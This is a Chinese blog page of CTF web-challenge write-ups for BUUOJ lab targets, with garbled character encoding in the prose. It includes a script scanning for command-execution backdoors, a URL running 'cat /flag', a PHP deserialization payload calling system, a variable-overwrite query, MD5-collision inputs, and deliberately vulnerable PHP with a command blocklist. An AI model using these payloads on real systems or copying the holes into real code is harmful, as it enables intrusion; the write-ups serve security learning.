<h1 id="å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢1-å¤šçº¿ç¨‹è„šæœ¬"><a href="#å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢1-å¤šçº¿ç¨‹è„šæœ¬" class="headerlink" title="[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢1  å¤šçº¿ç¨‹è„šæœ¬"></a>[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢1  å¤šçº¿ç¨‹è„šæœ¬</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">8</span>  <span class="comment"># è®¾ç½®é‡è¿æ¬¡æ•°ï¼Œé˜²æ­¢çº¿ç¨‹æ•°è¿‡é«˜ï¼Œæ–­å¼€è¿æ¥</span></span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>  <span class="comment"># è®¾ç½®è¿æ¥æ´»è·ƒçŠ¶æ€ä¸ºFalse</span></span><br><span class="line"></span><br><span class="line">sem = threading.Semaphore(<span class="number">30</span>)  <span class="comment"># è®¾ç½®æœ€å¤§çº¿ç¨‹æ•° ,åˆ«è®¾ç½®å¤ªå¤§ï¼Œä¸ç„¶è¿˜æ˜¯ä¼šå´©çš„æŒºå‰å®³çš„ï¼Œè·‘åˆ°å…³é”®çš„çˆ†ç‚¸ï¼Œå¿ƒæ€å°±çˆ†ç‚¸äº†</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://b751b59d-ba6b-4c1d-b529-fb28c591ffa1.node4.buuoj.cn:81/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‹è½½çš„æºæ–‡ä»¶è·¯å¾„,æ ¹æ®è‡ªå·±çš„è·¯å¾„ä¿®æ”¹</span></span><br><span class="line">path = <span class="string">r&quot;C:\Users\jyj\Downloads\www\src\\&quot;</span></span><br><span class="line"></span><br><span class="line">rrGET = re.<span class="built_in">compile</span>(<span class="string">r&quot;\$_GET\[\&#x27;(\w+)\&#x27;\]&quot;</span>)  <span class="comment"># åŒ¹é…getå‚æ•°</span></span><br><span class="line"></span><br><span class="line">rrPOST = re.<span class="built_in">compile</span>(<span class="string">r&quot;\$_POST\[\&#x27;(\w+)\&#x27;\]&quot;</span>)  <span class="comment"># åŒ¹é…postå‚æ•°</span></span><br><span class="line"></span><br><span class="line">fileNames = os.listdir(path)  <span class="comment"># åˆ—å‡ºç›®å½•ä¸­çš„æ–‡ä»¶,ä»¥æ¯ä¸ªæ–‡ä»¶éƒ½å¼€ä¸€ä¸ªçº¿ç¨‹</span></span><br><span class="line"></span><br><span class="line">local_file = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">fileName</span>):</span></span><br><span class="line">    <span class="keyword">with</span> sem:</span><br><span class="line">        file = <span class="built_in">open</span>(path + fileName, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        content = file.read()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]checking:%s&quot;</span> % fileName)</span><br><span class="line">        <span class="comment"># æµ‹è¯•getçš„å‚æ•°</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> rrGET.findall(content):</span><br><span class="line">            r = session.get(url + <span class="string">&quot;%s?%s=%s&quot;</span> % (fileName, i, <span class="string">&quot;echo ~h3zh1~;&quot;</span>))</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;~h3zh1~&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                flag = <span class="string">&quot;You Find it in GET fileName = %s and param = %s \n&quot;</span> % (fileName, i)</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                local_file.write(flag)</span><br><span class="line">    <span class="comment"># æµ‹è¯•postçš„å‚æ•°</span></span><br><span class="line">    <span class="comment"># for i in rrPOST.findall(content):</span></span><br><span class="line">    <span class="comment">#	r = session.post( url + fileName , data = &#123; i : &quot;echo ~h3zh1~;&quot; &#125; )</span></span><br><span class="line">    <span class="comment">#	if &quot;~h3zh1~&quot; in r.text:</span></span><br><span class="line">    <span class="comment">#		flag = &quot;You Find it in POST: fileName = %s and param = %s \n&quot; % ( fileName, i )</span></span><br><span class="line">    <span class="comment">#		print(flag)</span></span><br><span class="line">    <span class="comment">#		local_file.writelines(flag)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    start_time = time.time()  <span class="comment"># å¼€å§‹æ—¶é—´</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[start]ç¨‹åºå¼€å§‹:&quot;</span> + <span class="built_in">str</span>(start_time))</span><br><span class="line">    thread_list = []</span><br><span class="line">    <span class="keyword">for</span> fileName <span class="keyword">in</span> fileNames:</span><br><span class="line">        t = threading.Thread(target=run, args=(fileName,))</span><br><span class="line">        thread_list.append(t)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> thread_list:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> thread_list:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line">    end_time = time.time()</span><br><span class="line">    local_file.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[end]ç¨‹åºç»“æŸ:ç”¨æ—¶(ç§’):&quot;</span> + <span class="built_in">str</span>(end_time - start_time))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ°´å¹³æœ‰é™ï¼Œä¸çŸ¥é“è¿™ä¸ªè„šæœ¬å“ªé‡Œå‡ºé—®é¢˜äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://b3ade54715324b4aa9576af2310e8fd5.node4.buuoj.cn:81/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</span><br></pre></td></tr></table></figure>

<p>å‚è€ƒæ–‡ç« ï¼š[<a href="https://www.cnblogs.com/h3zh1/p/12661892.html">å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢ - ä½•æ­¢(h3zh1) - åšå®¢å›­ (cnblogs.com)</a></p>
<h1 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb1ååºåˆ—åŒ–"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb1ååºåˆ—åŒ–" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb1ååºåˆ—åŒ–"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb1ååºåˆ—åŒ–</h1><h2 id="èƒ½å¤Ÿè¯»å–æ–‡ä»¶çš„å‡½æ•°"><a href="#èƒ½å¤Ÿè¯»å–æ–‡ä»¶çš„å‡½æ•°" class="headerlink" title="èƒ½å¤Ÿè¯»å–æ–‡ä»¶çš„å‡½æ•°"></a>èƒ½å¤Ÿè¯»å–æ–‡ä»¶çš„å‡½æ•°</h2><p>fread   fgets  fgetss   file  readfile  file_get_contents  fpassthru parse_ini_file</p>
<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.jb51.net/article/53266.htm">https://www.jb51.net/article/53266.htm</a></p>
<p>å› ä¸ºé¡µé¢ä¸åœæ›´æ–°ï¼Œå› æ­¤å°è¯•æŠ“åŒ…ï¼Œå‘ç°ä¼ é€’çš„å‚æ•°ï¼Œç¬¬ä¸€ä¸ªä¸ºå‡½æ•°ï¼Œç¬¬äºŒä¸ªä¸ºå‡½æ•°é‡Œé¢çš„å‚æ•°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">   <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        <span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;form  id=form1 name=form1 action=<span class="string">&quot;index.php&quot;</span> method=post&gt;</span><br><span class="line">    &lt;input type=hidden id=func name=func value=<span class="string">&#x27;date&#x27;</span>&gt;</span><br><span class="line">    &lt;input type=hidden id=p name=p value=<span class="string">&#x27;Y-m-d h:i:s a&#x27;</span>&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;form  id=form1 name=form1 action=<span class="string">&quot;index.php&quot;</span> method=post&gt;</span><br><span class="line">    &lt;input type=hidden id=func name=func value=<span class="string">&#x27;date&#x27;</span>&gt;</span><br><span class="line">    &lt;input type=hidden id=p name=p value=<span class="string">&#x27;Y-m-d h:i:s a&#x27;</span>&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Text()å‡½æ•°åˆ©ç”¨äº†gettime()å‡½æ•°ï¼Œå¯ä»¥æ„æˆååºåˆ—åŒ–ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">     <span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">     <span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">     <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">     <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">             <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$a</span>=<span class="keyword">new</span> Test();</span><br><span class="line"> <span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°åºåˆ—åŒ–åçš„ç»“æœï¼Œæ¥ç€ååºåˆ—åŒ–ä¼ å‚ï¼Œå¹¶ä¸”ä¿®æ”¹å‘½ä»¤</p>
<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/jiluxuexi/p/13148685.html">https://www.cnblogs.com/jiluxuexi/p/13148685.html</a></p>
<h1 id="BJDCTF2020-Mark-loves-cat1"><a href="#BJDCTF2020-Mark-loves-cat1" class="headerlink" title="[BJDCTF2020]Mark loves cat1"></a>[BJDCTF2020]Mark loves cat1</h1><h2 id="å˜é‡è¦†ç›–æ¼æ´"><a href="#å˜é‡è¦†ç›–æ¼æ´" class="headerlink" title="å˜é‡è¦†ç›–æ¼æ´"></a>å˜é‡è¦†ç›–æ¼æ´</h2><p><a href="https://blog.csdn.net/qq_45521281/article/details/105849770">(45æ¡æ¶ˆæ¯) å˜é‡è¦†ç›–æ¼æ´æ€»ç»“_WHOAMIAnonyçš„åšå®¢-CSDNåšå®¢_å˜é‡è¦†ç›–æ¼æ´</a></p>
<p>æ²¡æ‰«å‡ºæ¥ï¼Œç›´æ¥çœ‹äº†wp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = file_get_contents(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;       </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;         </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>?is=flag&amp;flag=flag</p>
<p>exitï¼ˆï¼‰ æ˜¯ä¸€ä¸ªåœ¨è®¸å¤š æ“ä½œç³»ç»Ÿ å‘½ä»¤è¡Œ å£³å±‚ å’Œ è„šæœ¬è¯­è¨€ ä¸­å«æœ‰çš„å‘½ä»¤ï¼Œæ­¤å‘½ä»¤å¯¼è‡´shellæˆ–ç¨‹åº ç»ˆæ­¢ ã€‚ å¦‚æœåœ¨äº¤äº’å¼å‘½ä»¤shellä¸­æ‰§è¡Œï¼Œå°†ä¼šæ³¨é”€ç”¨æˆ·çš„å½“å‰ä¼šè¯ï¼Œæˆ–æ–­å¼€ç”¨æˆ·å½“å‰çš„ æ§åˆ¶å° æˆ– ç»ˆç«¯ è¿æ¥ã€‚</p>
<p><strong>ä¸­æ–‡å:</strong> exit()</p>
<p><strong>å‡½æ•°å:</strong> exit()</p>
<p><strong>å‚æ•°:</strong> status //ç¨‹åºé€€å‡ºçš„è¿”å›å€¼.</p>
<h1 id="BSidesCF-2020-Had-a-bad-day1"><a href="#BSidesCF-2020-Had-a-bad-day1" class="headerlink" title="[BSidesCF 2020]Had a bad day1"></a>[BSidesCF 2020]Had a bad day1</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">			<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">					<span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="http://ebd8e4e6-736c-484a-a80e-d728c049ba69.node4.buuoj.cn:81/index.php?category=woofers">http://ebd8e4e6-736c-484a-a80e-d728c049ba69.node4.buuoj.cn:81/index.php?category=woofers</a></p>
<p>é¦–å…ˆè§‚å¯Ÿè¿™ä¸ªurl ï¼Œå­˜åœ¨index.phpæ–‡ä»¶ï¼Œåˆ©ç”¨ä¼ªåè®®è¯»å–ä¸€ä¸‹ï¼Œè¿”ç°æœ‰é”™è¯¯ï¼Œ</p>
<p>category=wooferså°±æ²¡æœ‰Phpï¼Œå°è¯•æŠŠåé¢çš„phpåˆ é™¤æ‰ï¼Œç„¶åå°±è¯»å‡ºäº†ä¸Šé¢çš„å†…å®¹ã€‚éœ€è¦åŒ…å«ä¸Šé¢çš„ä»»ä½•ä¸€ä¸ªæ‰èƒ½è¯»å–å‡ºæ¥ï¼Œå› æ­¤æŒ‰ç…§ä¸Šé¢çš„æ„é€ </p>
<h1 id="å®‰æ´µæ¯-2019-easy-web1"><a href="#å®‰æ´µæ¯-2019-easy-web1" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web1"></a>[å®‰æ´µæ¯ 2019]easy_web1</h1><p><strong>imgåœ¨å­˜å…¥åå°çš„æ—¶å€™å…ˆè¿›è¡Œä¸€æ¬¡hexåŠ å¯†ï¼Œç„¶åè¿›è¡Œä¸¤æ¬¡base64åŠ å¯†ï¼Œå¯¹imgè¿›è¡Œè§£å¯†ï¼Œå¾—åˆ°555.php,çŒœæµ‹æºç åœ¨index.phpæ–‡ä»¶ä¸­ï¼Œè¿›è¡ŒåŠ å¯†å¾—åˆ°æºç </strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = hex2bin(base64_decode(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixiï½ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) </span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆè¦æ»¡è¶³è¿™ä¸ªæ¡ä»¶æ‰èƒ½è¿›è¡Œè¾“å‡ºæ‰§è¡Œcmdï¼Œ</p>
<h2 id="MD5å¼ºç¢°æ’"><a href="#MD5å¼ºç¢°æ’" class="headerlink" title="MD5å¼ºç¢°æ’"></a>MD5å¼ºç¢°æ’</h2><p>å¯ä»¥é‡‡ç”¨æ•°ç»„å’Œå­—ç¬¦ä¸²ï¼Œè¿™é‡Œå¼ºå­è¦æ±‚é‡‡ç”¨å­—ç¬¦ä¸²</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line"></span><br></pre></td></tr></table></figure>

